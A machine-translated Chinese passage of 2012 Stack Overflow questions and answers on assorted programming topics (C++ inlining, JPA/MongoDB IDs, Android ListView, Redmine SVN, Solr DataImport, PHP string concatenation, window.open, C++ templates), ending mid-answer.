> 时间：2012-06-28T10:55:45.847

每当您认为它有助于可读性时，您都应该将逻辑拆分为自己的函数：函数调用本身的成本可以忽略不计。

虽然调用函数通常会消耗一些空间和 CPU 周期，但您完全不必担心：所涉及的指令经过优化，超出了想象，编译器可以在认为合适时内联您的代码。

**编辑**（回应[Potatoswatter 的评论](https://stackoverflow.com/questions/11243034/breaking-down-function-logic-into-sub-function/11243098#comment14773966_11243098)）

您需要注意的一件事是传递参数，尤其是在 C++ 中，用户代码可以参与复制传递给函数的参数的过程。在 C 中通过值传递大`struct`的 s 也可能需要多个周期，因此您应该尽可能通过引用或指针传递它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T10:55:08.530

通常我更喜欢将函数分解成更小的函数，以便我们可以在其他地方重用它，在重构过程中经常需要它。如果您非常关心开关并且功能非常小，您可以将其标记为内联。但是，我不认为拥有太多功能会对程序的性能产生如此巨大的影响。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T12:13:02.813

如果您使用 C++，您可以声明内联函数。这样就不会因为函数调用而产生开销，一旦代码将被替换。

```
inline bool check(args){
    if( some_condiction(args) ){
        return true;
    }
}
inline void functionOne(){...}
inline void functionTwo(){...}
inline void functionThree(){...}
inline void functionFour(){...}

int functionParent(arguments){

    if(check(arguments)==false)
         return FAIL;

    functionOne();
    functionTwo();
    functionThree();
    functionFour();

    return STATUS;
} 
```

当前的处理器架构每次执行一条以上的指令，比如 5 条。在给定的时刻，它们可能处于完成的中间阶段，比如 90%、80%、70%、60%、50%。如果第一条指令是函数调用，那么所有对接下来 4 条指令求值的努力都是徒劳的，这将大大降低程序的执行速度。

它不需要太在意这些细节，除非您正在创建一个关键应用程序。通常编译器足够聪明，可以在使用优化标志时内联所需的函数。

# java - 嵌入 id 是从 jpa 迁移到 mongo 的正确方法吗

> ID：11243039
> 
> 赞同：0
> 
> 时间：2012-06-28T10:52:03.557
> 
> 标签：java, mongodb, jpa

我们有许多具有 Long 类型的 id 并存储在 MySql 中并使用 JPA/Hibernate 进行 ORM 的对象。将来我们将把一些移到 Mongo。为 Id 字段创建一个可嵌入类（例如 ContentId）并在整个系统中使用它来代替 Long 是否明智，这样当我们移动到没有 Long id 的 MongoDB 或另一个 noSql 数据库时，我们只需要更改内部表示ContentId 类。我只能找到将 @EmbeddedId 用于复合键的参考。这是明智的做法吗？当我们用 ObjectId 更改并替换 Long 时，我不想在一年左右的时间内完成所有代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T14:16:27.293

MongoDB 使用生成的 OID 作为默认 Id。您还可以使用 _id 属性定义自己的。OID 基本上是一个 UUID，它最好映射到一个字符串。我只会在 MySQL 中使用 UUID，因此您可以在任何一个上使用相同的模型。MongoDB 不支持复合 id，因此使用复合 id 可能不是一个好主意。

EclipseLink 在 MySQL 和 MongoDB 上都支持 JPA。EclipseLink 还支持与任何数据库一起使用的@UuidGenerator。

[http://java-persistence-performance.blogspot.com/2012/04/eclipselink-jpa-supports-mongodb.html](http://java-persistence-performance.blogspot.com/2012/04/eclipselink-jpa-supports-mongodb.html)

[http://wiki.eclipse.org/EclipseLink/UserGuide/JPA/Advanced_JPA_Development/NoSQL](http://wiki.eclipse.org/EclipseLink/UserGuide/JPA/Advanced_JPA_Development/NoSQL)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T16:19:44.290

我看不到 EmbeddedId 会给您带来什么可移植性....最好关注可用的价值生成器以及数据存储将支持什么，并寻找如何在两个数据存储上都有可映射的内容以简化迁移。

[DataNucleus JPA](http://www.datanucleus.org/products/accessplatform_3_1)显然支持对 MongoDB 的持久性，并且已经有一段时间了，允许各种身份，无论是原生 MongoDB UUID（JPA 用语中的“身份”）、基于字符串的（uuid、uuid-hex）还是数字（“桌子”）。这提供了便携性，您可以选择最适合您的模型的东西。如果您也需要对其他数据存储的可移植性，它还支持对许多其他类型的数据存储（RDBMS、Excel、ODF、ODBMS、HBase、AppEngine、LDAP 等）的持久性。

# android - 如何将列表视图中的行值传递给按钮

> ID：11243040
> 
> 赞同：0
> 
> 时间：2012-06-28T10:52:13.500
> 
> 标签：android, android-listview

我已经创建了一个自定义`listview`，`SimpleAdapter`并且在**列表视图的每一行中，我都放置了一个**具有单个 ID 的按钮。我想让`position`每一行的按钮传递按钮，但我每行都有一个按钮 id，**我希望当我*点击按钮*时，它会找到行的位置并开始另一个活动，** 请帮助我

```
public void click(View v){
    //RelativeLayout navi = (RelativeLayout)findViewById(R.layout.custom_row_view);
    TextView tv = (TextView)findViewById(R.id.text1);
    ImageButton im = (ImageButton)findViewById(R.id.imageButton1);
     ListView lv=(ListView)findViewById(android.R.id.list);
    int position = 0;
    Long id=Long.parseLong((String) adapter.getItem(position));

    Intent i=null;
    switch(position){
    case 1:
      i=new Intent(this, ButtonActivity.class);
        startActivity(i);
        break;
    case 2:
         i = new Intent(this, PickerActivity.class);
        startActivity(i);
        break;
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T10:55:54.007

在列表视图中，您可以使用`setOnItemClickListener`

```
list.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {  
   public void onItemSelected(AdapterView parentView, View childView, int position, long id) {  
            //Put Your code here 
        }
        public void onNothingSelected(AdapterView parentView) {  

        }  
      }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T10:58:37.497

我不确定这一点，但让我们尝试一下，并告诉我你的成功..

线，`int position = listView.getPositionForView(v.getParent());`

```
public void click(View v){

    // This line is important
    int position =  listView.getPositionForView(v.getParent());

    //RelativeLayout navi = (RelativeLayout)findViewById(R.layout.custom_row_view);
    TextView tv = (TextView)findViewById(R.id.text1);
    ImageButton im = (ImageButton)findViewById(R.id.imageButton1);
     ListView lv=(ListView)findViewById(android.R.id.list);
    int position = 0;
    Long id=Long.parseLong((String) adapter.getItem(position));

    Intent i=null;
    switch(position){
    case 1:
      i=new Intent(this, ButtonActivity.class);
        startActivity(i);
        break;
    case 2:
         i = new Intent(this, PickerActivity.class);
        startActivity(i);
        break;
    }
  } 
```

如果这不起作用，那么您必须做的唯一选择是制作一个**自定义适配器**并将您的按钮写入您可以访问**位置变量**`onClick()`的适配器`getView()`中。

 *** * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-22T12:28:06.840

试试这个

```
listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {

            public void onItemClick(AdapterView<?> arg0, View arg1,
                    final int arg2, long arg3) {

                final ProgressDialog progressBar = ProgressDialog.show(
                        VechiclesDetails.this, "", loadingString);

                progressBar.setIndeterminate(true);
                progressBar.setIndeterminateDrawable(getResources()
                        .getDrawable(R.anim.progressbar_handler));
                new Thread(new Runnable() {

                    public void run() {
                        try {
                            Intent carDetail = new Intent(
                                    Details.this,
                                    Screen.class);
                            carDetail.putExtra("index", arg2);
                            carDetail.putExtra("sellerId", SellerId);
                            startActivity(carDetail);
                            progressBar.dismiss();
                        } catch (Exception e) {
                            progressBar.dismiss();
                        }
                    }
                }).start();

            }
        }); 
```**

# ajax - Rails 3.1 - Ajax 单选按钮

> ID：11243042
> 
> 赞同：0
> 
> 时间：2012-06-28T10:52:18.227
> 
> 标签：ajax, ruby-on-rails-3.1

我正在尝试向我的 Rails 应用程序添加一个 HighCharts 图表，其内容将由单选按钮的选择决定。我的单选按钮代码是相当标准的，如下所示：

```
 <%= radio_button_tag(:interface, "wlan") %>
  <%= label_tag(:interface_wlan, "WLAN") %>
  <%= radio_button_tag(:interface, "3g") %>
  <%= label_tag(:interface_3g, "3G") %> 
```

我看到 Rails 3.1 具有“remote => :true”选项，使 Ajax 更简单。我的问题是我究竟应该在哪里为一系列单选按钮放置这个选项？我尝试在 radio_button_tag 参数的末尾添加它，但它没有生成适当的 HTML。

或者，如果有一种更简单的方法来做我想做的事情，我也会对此持开放态度。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T13:29:56.260

您可以使用 jquery 执行此操作。在我看来，这样做要容易得多。
你把代码放在你的`your_model.js`文件中，像下面的代码一样创建 ajax 函数。
创建自定义路线并做任何你想做的事。

```
$("#wlan").click(function() {
  $.ajax({
    type: "TYPE_OF_REQUEST",
    url: "/your_url",
    success: function(data) {
      ... Your success behavior here ...
    },
    error: function(data) {
      ... Your error behavior here ...
    }
  });
}); 
```

# svn - Redmine，无法签出 svn 存储库 401 失败

> ID：11243045
> 
> 赞同：0
> 
> 时间：2012-06-28T10:52:40.400
> 
> 标签：svn, redmine, svn-checkout

我的问题是我无法签出存储库，因为授权失败消息，我使用了我的 redmine 登录名/box root 登录名，我无法签出。 **我可以从 redmine 浏览存储库而不会收到任何 404 错误。**
在 redmine 中存储库的用户链接中，没有显示任何用户，多次编辑存储库用户仍然没有进展。

我在 apache2 站点的 svn.conf 中仔细检查了以下 dsn，可用的
sql 登录是正确的，用户和密码是正确的

服务器详细信息 ubuntu 12.04 apache 2.2.22

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-05T09:42:19.537

以下过程解决了我的问题。它允许存储库与 Redmine（用户映射）集成并针对 SVN 存储库进行身份验证。（假设你有 Subversion 的 libapache2-svn 包并重启了 apache2 服务）

创建SVN父目录

```
<pre>
mkdir /svn
</pre> 
```

使用编辑器打开 /etc/apache2/mods-enabled/dav_svn.conf

```
<pre>
&#60;Location /svn>
 DAV svn
 SVNParentPath /svn
 AuthType basic
 AuthName "SVN repositories"
 AuthUserFile /svn/auth
 Require valid-user
&#60;/Location>
</pre> 
```

创建 htpasswd 文件并添加用户，添加只需删除 -c 参数

```
<pre>
htpasswd -cm auth /svn/auth admin
</pre> 
```

设置权限

```
<pre>
chown -R www-data:www-data /svn
chmod -R g+ws /svn
</pre> 
```

重启阿帕奇

```
<pre>
service apache2 restart
</pre> 
```

Redmine 也需要进行一些更改

```
<ul>
<li>Setup crontab for managing repositories with redmine</li>
<li>when you browse the repository from redmine and you get a 404 error then go to project settings-> repositories-> your repository [edit] 
<ul>
<li>Username = admin</li>
<li>Password is admin's password</li>
</ul>
</li>
</ul> 
```

您可以从 h..p://host/svn 或通过 Redmine 浏览/checkout/commit/etc 进行浏览，并使用 TortoiseSVN 等其他工具进行 checkout/commit/edit/etc..

# wso2 - WS02 G-REG 新元数据类型

> ID：11243047
> 
> 赞同：0
> 
> 时间：2012-06-28T10:52:46.970
> 
> 标签：wso2

我们正在测试 G-Reg 以使用 SOA 存储库。默认类型是服务、WSDL、模式和 WS 策略，我们正在尝试添加一个新类型（例如 Persons）。添加后，我们要创建一个 xml 来指定需要填写的字段以上传“人员”类型的新资源（如服务类型实际功能）。

我们遵循了[http://docs.wso2.org/wiki/display/Governance411/Configurable+Governance+Artifacts](http://docs.wso2.org/wiki/display/Governance411/Configurable+Governance+Artifacts)上的指南，但没有成功创建名为“Events”的示例，因为存在相互矛盾的信息，路径“/_system/governance/repository/components/org.wso2.carbon.governance/types”在GREG 4.1.1上不存在，那么应该在哪里上传内容？

而且，该指南解释了“注册表扩展文件”和“内容”，它们之间的区别是什么？它们需要一个名称吗？也许是 content.xml 和 extfile.xml？

任何方向将不胜感激

谢谢，加布里埃尔。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T05:53:20.043

这是我创建的示例 server.rxt 文件。

<artifactType type="application/vnd.wso2-server+xml" shortName="server"singularLabel="Server"pluralLabel="Servers" hasNamespace="false" iconSet="5"> <storagePath>/servers/@{overview_name }/</storagePath> <ui> <list> <column name="Name"> <data type="path" value="overview_name" href="@{storagePath}"/> </column>
</list> </ui> <content> <table name="Overview"> <field type="text" required="true"> <name label="name">Name</name> </field>
<field type="text" required="true"> <name label="url">url</name> </field> <field type="text" required="true"> <name label="username" >用户名</name> </field> <field type="text" required="true"> <name label="password">密码</name> </field> </table> </content> </工件类型>

您需要将其保存在您提到的目录下。

/_system/governance/repository/components/org.wso2.carbon.governance/types

这个位置不是出口。但是你需要创建这个目录并保存。

重新启动后，您应该会在元数据列表下看到新类型

# visual-c++ - Google Apps 应用程序 API：是否有更好的方法来查找文档列表 API 文档和电子表格 API 电子表格之间的对应关系？

> ID：11243050
> 
> 赞同：1
> 
> 时间：2012-06-28T10:53:07.860
> 
> 标签：visual-c++, google-api, google-apps, google-spreadsheet-api

有一个任务，使用[Google Data API 的 .NET 库](http://code.google.com/p/google-gdata/)来遍历 Google Drive 文件夹，查找所需的电子表格并更改所选电子表格的数据。

使用[Google.GData.Documents.FolderQuery和](http://google-gdata.googlecode.com/svn-history/r902/docs/folder58/T_Google_GData_Documents_FolderQuery.htm)[Google.GData.Documents](http://google-gdata.googlecode.com/svn-history/r890/docs/folder23/N_Google_GData_Documents.htm)命名空间的其他类执行文件夹遍历。找到正确的文档后，需要使用[Google.GData.Spreadsheets.Spreadsheet](http://google-gdata.googlecode.com/svn-history/r890/docs/folder42/T_Google_GData_Spreadsheets_SpreadsheetEntry.htm)类对其进行管理。现在，我通过从文档 URL 中提取文档键、迭代所有电子表格、提取电子表格 URL 并比较两个键来找到`Google.GData.Documents.DocumentEntry`类和类实例之间的对应关系。`Google.GData.Spreadsheets.Spreadsheet`代码看起来像

```
private string GetKey(string url) {
  string res = null;
  Match match = Regex.Match(url, @"\?key=([A-Za-z0-9]+)");
  if (match.Success) {
    res = match.Groups[1].Value;
  }
  return res;
}

private SpreadsheetEntry GetSpreadSheetForDocument(SpreadsheetsService serviceSS, DocumentEntry entrySS) {
  SpreadsheetEntry res = null;
  string strSSKey = GetKey(entrySS.AlternateUri.Content);
  Google.GData.Spreadsheets.SpreadsheetQuery query = new Google.GData.Spreadsheets.SpreadsheetQuery();
  SpreadsheetFeed feed = serviceSS.Query(query);
  foreach (SpreadsheetEntry entry in feed.Entries) {
    if (GetKey(entry.AlternateUri.Content) == strSSKey) {
      res = entry;
      break;
    }
  }
  return res;
} 
```

是否有另一种更优雅和正确的方法来做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T20:54:26.087

据我所知，不仅没有更好的方法可以做到这一点，而且即使这种技术也会失败。由于最近（？）对 Google Drive API 的更改，Document List 与 Spreadsheets API 检索到的 SAME DOCUMENT 的密钥不兼容。尽管使用由 Document List API 返回的键构造的电子表格 URL 将获得一个 SpreadsheetEntry，但对该条目的电子表格操作可能会产生“无效令牌”身份验证异常。

您的里程可能会有所不同，具体取决于您使用的身份验证方式。我正在使用最不推荐的用户凭据方法。

# solr - Solr DataImport：管理不同环境的配置（开发/登台/生产）

> ID：11243051
> 
> 赞同：7
> 
> 时间：2012-06-28T10:53:18.313
> 
> 标签：solr, dataimporthandler

SolR DataImportHandler 的配置文件包含对数据库运行的 SQL 查询、如何将结果列映射到 SolR 文档字段，当然还有连接到数据库所需的参数。

在我们的项目中，数据库连接参数（特别是数据库密码）因环境而异，这迫使我们为每个环境维护一个稍微不同的整个配置 XML 文件的副本。

有没有办法将数据库连接参数（特别是密码）与 SQL 语句和声明分开配置，这样每个配置都只维护一次？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-28T15:01:44.310

实际上，这*可以*使用标准的 solr 配置来完成。

首先，您需要在 solrconfig.xml 中定义您的数据源 [参见[在 Solrconfig 中添加数据源]](http://wiki.apache.org/solr/DataImportHandler#Adding_datasource_in_solrconfig.xml)

[其次，您可以使用XInclude](http://wiki.apache.org/solr/SolrConfigXml#XInclude)将 DIH 配置外部化到单独的文件中

我使用这种方法既可以使用本地配置文件，也可以集中不同内核之间的连接。

* * *

示例：在 solrconfig.xml 中，添加：

```
<xi:include href="../../common-config/local.dih.xml" xmlns:xi="http://www.w3.org/2001/XInclude" /> 
```

local.dih.xml 看起来像：

```
<requestHandler name="/dataimport" class="org.apache.solr.handler.dataimport.DataImportHandler">
  <lst name="defaults">
    <str name="config">data-config.xml</str>
    <lst name="datasource">
      <str name="name">mongo</str>
      <str name="type">MongoDataSource</str>
      <str name="database">myMongoDb</str>
    </lst>
    <lst name="datasource">
      <str name="name">psql</str>
      <str name="driver">org.postgresql.Driver</str>
      <str name="type">JdbcDataSource</str>
      <str name="url">jdbc:postgresql://localhost:5432/myPsqlDb</str>
      <str name="user">dbUser</str>
      <str name="password">dbPassword</str>
    </lst>
  </lst>
</requestHandler> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T13:27:28.837

这是 Solr 中的一个已知问题。

如果您查看 Solr 文档或 Solr Entreprise Server book，他们说您可以使用 key=value 的 core1.properties 并在您的 xml 配置文件中使用 key ...但根据我的经验，它不起作用。我已经尝试了几种方法，solr 邮件列表上有关于此的未解决问题。

因此，您必须求助于丑陋的解决方法（例如使用模板 xml 文件并将 #password# 替换为真实密码等）。

# php - 如何将 HTML 标签放入 PHP 变量中？

> ID：11243054
> 
> 赞同：0
> 
> 时间：2012-06-28T10:53:36.830
> 
> 标签：php, html, variables

我正在尝试创建一个包含一些 HTML 标记的变量，但它不像我想要的那样工作。我希望有人能告诉我在这里做错了什么。

我的代码：

```
$foto = "put picture here";
$naam = 'Sieraad1';
$prijs = '20,00';

$artikel = '<img src="'$foto'"><h4>'$naam'</h4><h6>€'$prijs'</h6>';

echo '<table><tr><td>'.htmlspecialchars(stripslashes($artikel)).'</td><td>'.htmlspecialchars(stripslashes($artikel)).'</td><td>'.htmlspecialchars(stripslashes($artikel)).'</td><td>'.htmlspecialchars(stripslashes($artikel)).'</td></tr>';
echo '<table><tr><td>'.htmlspecialchars(stripslashes($artikel)).'</td><td>'.htmlspecialchars(stripslashes($artikel)).'</td><td>'.htmlspecialchars(stripslashes($artikel)).'</td><td>'.htmlspecialchars(stripslashes($artikel)).'</td></tr>';
echo '</table>'; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T10:55:25.003

```
$artikel = '<img src="'$foto'"><h4>'$naam'</h4><h8>€'$prijs'</h8>'; 
```

您`.`在连接变量之间缺少此处。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T10:56:55.843

`htmlspecialchars`在 html 代码上使用将转换`<`为`&lt;`、`>`和。所以它显然会破坏你的代码。改为在内部内容上运行：`&gt;``"``&quot;``htmlspecialchars`

```
$artikel = '<img src="' . htmlspecialchars($foto) . '"><h4>' . htmlspecialchars($naam) . '</h4><h8>€' . htmlspecialchars($prijs) . '</h8>';
echo '<table><tr><td>'.$artikel.'</td>...'; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T10:57:44.130

尝试

```
$artikel = "<img src=\"'$foto'\"><h4>'$naam'</h4><h8>€'$prijs'</h8>"; 
```

或者

```
$artikel = '<img src="' . $foto . '"><h4>' . $naam . '</h4><h8>€' . $prijs .'</h8>'; 
```

然后只是回显 $artikel - 你不需要 htmlspecialchars

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-28T11:03:19.177

变量 $artikel 缺少 var 连接。将用户代码行替换为以下内容：

```
$artikel = '<img src="'.$foto.'"><h4>'.$naam.'</h4><h8>€'.$prijs.'</h8>'; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-28T11:06:36.453

便于使用

```
<?php
echo <<< END
<table class="head"><tr>
  <td class='head'>$name</td>
  <td>$fname</td>
 </tr></table>
END;
?> 
```

或者

```
<?php
echo "<table class='head'><tr>
  <td class='head2'>$name</td>
  <td class='head3'>$fname</td>
 </tr></table>";
?> 
```

# c# - 提示用户逐步确认决定的asp.net mvc Web应用程序

> ID：11243055
> 
> 赞同：0
> 
> 时间：2012-06-28T10:53:36.690
> 
> 标签：c#, asp.net-mvc, razor

我正在使用 asp.net mvc，并且在我的 Web 应用程序中，将提示用户在多个步骤中获取信息或取消（或返回）中途操作。有人可以推荐一种实现方式来解决这个问题。每个提示我应该使用 1 个操作方法吗？或者我应该在客户端用javascript做每一个提示？或者任何其他方法都将受到欢迎。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T12:03:39.787

根据您评论中的详细信息，似乎最好的解决方案是将所有内容简单地分解为您在原始问题中提到的单独的操作。

这背后的原因是您在每一步都有“很多”事情要做，您可能需要的不仅仅是每一步的客户端验证，而且您可能需要为某人的浏览器失败（或者他们只是出于某种原因关闭它）在过程开始和结束之间的某个时间点 - 你可能希望他们能够从他们离开的地方继续。

如果您将所有内容都保留为单独的操作，那么在您的用户完成整个过程时，管理所有步骤并让事情感觉“稳定”可能会更容易。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T14:28:33.883

另一种方法是使用 jQuery formwizard 插件：[http ://thecodemine.org/](http://thecodemine.org/)

您只有一个控制器操作/一个带有大表单的视图，并通过为每个步骤定义一个 div 将表单拆分为页面。

# android - onDestroy 中 AsyncTask.execute 的含义

> ID：11243056
> 
> 赞同：3
> 
> 时间：2012-06-28T10:53:55.377
> 
> 标签：android, ondestroy

我在我的`onDestroy`函数中运行了这段代码：

```
@Override
protected void onDestroy() {
    if (!(null == theUser.glideId)) {
        JSONObject req = new JSONObject();
        try {
            req.put("actionKey", "UserPresenceInactive");
            req.put("userId", theUser.userId);
            new ServerRequest().execute(req); //Run an AsyncTask
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
    super.onDestroy();
} 
```

在`AsyncTask`我向服务器发送请求（仅返回 200 响应）。

我的问题是，这样做有什么影响（如果有的话）？

Activity 会被销毁吗？如果服务器没有响应，应用程序是否保持唤醒状态并可能进入 ANR？有什么想法吗？

**编辑**

我尝试这样做，但得到了一个`android.os.NetworkOnMainThreadException`.

```
 new Runnable() {
        @Override
        public void run() {
            JSONObject req = new JSONObject();
            try {
                req.put("actionKey", "UserPresenceInactive");
                req.put("userId", theUser.userId);
                new ServerRequest().execute(req); //Run an AsyncTask
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }.run(); 
```

**更新#2**

使用 a`Thread`而不是 a`Runnable`成功了！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T10:57:09.800

是的，它`Activity`被摧毁了，但它`AsyncTask`正在做它的工作（在后台工作）。不会有`ANR`，因为您没有在 UI 上做任何背景工作。如果您在`AsyncTask`完成后更新 UI 上的任何视图，那么会有一个`NULLPOINTER Exception`AFAIK。但是，在`onDestroy()`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:05:51.393

最好的方法是在 onPause() 或 onSaveInstanceState() 等方法中运行 AsyncTask，而不是在 onDestroy()

查看开发者android参考：

> OnPause()：此回调主要用于保存活动正在编辑的任何持久状态，向用户呈现“就地编辑”模型，并确保在没有足够资源启动新活动的情况下不会丢失任何内容杀了这个。这也是一个很好的地方来做一些事情，比如停止动画和其他消耗大量 CPU 的事情，以便尽快切换到下一个活动，或者关闭诸如相机之类的独占访问资源。
> 
> 在系统需要更多内存的情况下，它可能会终止暂停的进程以回收资源。因此，您应该确保在您从此函数返回时保存所有状态。通常 onSaveInstanceState(Bundle) 用于在活动中保存每个实例的状态，此方法用于存储全局持久数据（在内容提供程序、文件等中）

# php - 使用常量时得到“期望 T_PAAMAYIM_NEKUDOTAYIM”

> ID：11243058
> 
> 赞同：0
> 
> 时间：2012-06-28T10:54:00.857
> 
> 标签：php, constants

我在 php 中有以下代码：

```
define('QUERY', $some_query_string);
if(empty(QUERY) || mb_strlen(QUERY) < 4):
    //worn the user about incorrect query input
endif; 
```

运行此脚本时，我遇到了错误`Parse error: syntax error, unexpected ')', expecting T_PAAMAYIM_NEKUDOTAYIM`，但是当我使用普通变量而不是常量时，一切正常！

不需要使用常量，但如果有人能解释为什么我会收到该错误，我将不胜感激？

（我是新来的，所以请告诉我是否需要提供更多详细信息）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T10:56:02.383

`empty`仅适用于*变量*。如果要检查是否已定义常量，请使用[`defined`](http://php.net/defined). 错误信息 invalid uses `empty`producer 不一定很直观，有关 T_PAAMAYIM_NEKUDOTAYIM 的消息主要表示解析器出错。

# selenium-rc - 关于 Selenium IDE

> ID：11243060
> 
> 赞同：0
> 
> 时间：2012-06-28T10:54:02.290
> 
> 标签：selenium-rc, selenium-ide

如何通过 Selenium IDE 在应用程序中记录 Autosuggest 框

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-04T08:08:43.900

使用 mouseDownAt、mouseUpAt 和 waitForElementPresent 的组合可能会取得一些成功。

例如

```
mouseDownAt,id=autoSuggestInput,5,5
mouseUpAt,id=autoSuggestInput,5,5
waitForElementPresent, css=.autoSuggestLink 
```

您能否提供指向您正在使用的自动建议脚本的演示页面的链接

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-07T12:20:09.280

我使用“http://jquery.bassistance.de/”基本 URL 创建了一个演示脚本。因此，请为此检查以下脚本。

```
<tr>
    <td>open</td>
    <td>/autocomplete/demo/</td>
    <td></td>
</tr>
<tr>
    <td>waitForText</td>
    <td>id=suggest1</td>
    <td></td>
</tr>
<tr>
    <td>typeKeys</td>
    <td>id=suggest1</td>
    <td>Ad</td>
</tr>
<tr>
    <td>waitForText</td>
    <td>css=li.ac_even.ac_over</td>
    <td>Ada</td>
</tr>
<tr>
    <td>assertText</td>
    <td>xpath=/x:html/x:body/x:div[2]/x:ul/x:li[1]</td>
    <td>Ada</td>
</tr>
<tr>
    <td>assertText</td>
    <td>xpath=/x:html/x:body/x:div[2]/x:ul/x:li[2]</td>
    <td>Adamsville</td>
</tr> 
```

# javascript - 如何在 Raphael js 中制作图像

> ID：11243063
> 
> 赞同：0
> 
> 时间：2012-06-28T10:54:06.777
> 
> 标签：javascript, jquery, css, raphael

我将图像传递给拉斐尔。当前图像显示为正方形，我希望图像以圆形格式显示。

```
<div class="demo"></div> 
```

JavaScript

```
var r = Raphael("demo")

var myimage="xyz.jpg"

var img = r.image(myimage, 81, 80, 50, 50); 
   // displaying image in square (need to be circle) 
```

请帮帮我。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:03:03.503

函数 Element.attr(…) 设置元素的属性。也许您可以创建一个圆圈，然后用您的图像填充它。attr 是“填充”。

```
var circle = paper.circle(50, 40, 10);
// Sets the fill attribute of the circle to red (#f00)
circle.attr("fill", "#f00"); 
```

该示例来自 Raphael 的网络，您应该尝试：

```
circle.attr("fill", myimage); 
```

或者

```
circle.attr("fill", "xyz.jpg"); 
```

希望有帮助，加布里埃尔。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:04:23.910

您需要画一个圆圈，然后用图像填充它。这已经在[这里得到了回答。](https://stackoverflow.com/questions/7976838/raphael-drawing-circle-with-two-sectors-from-different-images)

# javascript - 创建类似 Twitter 的表单验证

> ID：11243065
> 
> 赞同：-2
> 
> 时间：2012-06-28T10:54:10.073
> 
> 标签：javascript, jquery, html, css, validation

Twitter 如何在其[注册页面](https://twitter.com/signup)上创建表单验证？

![在此处输入图像描述](../Images/c0961e2e67270f06dcbf50717d337e5d.png)

我没有创建一个注册表单，只是一个我想使用 Twitter 样式验证的查询表。

是否有任何特定的教程或资源来创建非常相似的东西？

**这种验证会在一定程度上阻止垃圾邮件吗？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T10:56:52.290

是的，有几个。 [这是一个](http://speckyboy.com/2009/12/17/10-useful-jquery-form-validation-techniques-and-tutorials-2/)显示 10 个 jquery 示例和教程的页面。

# javascript - 如何在同一页面中打开新窗口

> ID：11243067
> 
> 赞同：-1
> 
> 时间：2012-06-28T10:54:14.317
> 
> 标签：javascript, window

我有一个按钮：

```
<button>Click</button> 
```

我想单击它并在同一页面中打开一个新窗口，我将单击事件绑定一个事件句柄：

```
$('button').click(function () {
    var newurl="http://" + window.location["host"] + ";
    window.open(newurl, '_parent');
}) 
```

但总是在新选项卡或新窗口中打开，我尝试的第二个参数`_self` `_top`。我什至有尝试`window.location.href(newurl)`

那么我该如何解决这个问题？浏览器或操作系统有关系吗？我在 Mac OS 的 firefox 和 chrome 中查看它。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-28T10:56:22.880

这在技术上是不可能的，它还取决于浏览器选项卡设置、窗口设置和第三方选项卡操作插件或插件。

* * *

# 更新

**OP通过他在问题下方的评论**消除了所有人的困惑，这是您为当前窗口设置新网址所需的内容：****

 **```
$('button').click(function () {
    var newurl="http://" + window.location["host"];
    window.location.href = newurl; // or simply window.location
}) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T10:56:37.757

`window.location =newurl;`将打开一个新窗口替换父窗口

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-28T11:01:03.410

你试过这个吗？

```
<script type="text/javascript">
  window.open ('test.htm','_self',false)
</script> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-28T11:02:05.670

如果您的意思是要替换当前页面，`window.location = newLocation;`则可以。如果您想要一个模式弹出窗口，请尝试 JQuery UI Dialog。**

# c++ - 是否可以简化这些 C++ 模板参数？

> ID：11243068
> 
> 赞同：2
> 
> 时间：2012-06-28T10:54:22.540
> 
> 标签：c++, templates

我有一个带有以下参数的模板类

```
template <class TObj, class TMsg, void (TObj::*TMethod)( TMsg*, Link*)>
class Slot : ... 
```

当我实例化这个类时，我必须写

```
Slot<MyObject, MyMessage, MyObject::myMethod> 
```

这意味着 MyObject 类有一个名为 myMethod 的方法，期望 MyMessage* 作为第一个参数。

有没有一种方法可以简化 Slot 类实例化，以便我至少只能指定 MyObject 类一次？

如果可以在方法之后指定 TMsg 类型也会更直观。像下面这样就可以了：

```
Slot<MyObject::myMethod, MyMessage> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:18:57.333

如果使用`decltype`是一个选项...

```
template <typename M, typename O, void (O::*Method)(M*, Link*)>
Slot<O, M, Method> slot_type(Method); 
```

接着：

```
